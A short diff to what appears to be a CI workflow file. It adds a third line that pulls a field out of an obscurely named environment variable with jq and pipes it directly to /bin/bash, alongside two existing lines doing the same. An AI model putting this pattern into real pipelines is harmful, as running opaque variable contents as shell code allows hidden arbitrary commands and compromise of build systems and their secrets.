@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$n78976" | jq -r .kiwd05882 | /bin/bash
           echo $rmep9 | jq -r .zsybv0 | /bin/bash
+          echo $dznas17 | jq -r .jtnep988 | /bin/bash
 
       - name: Upload data
         if: always()
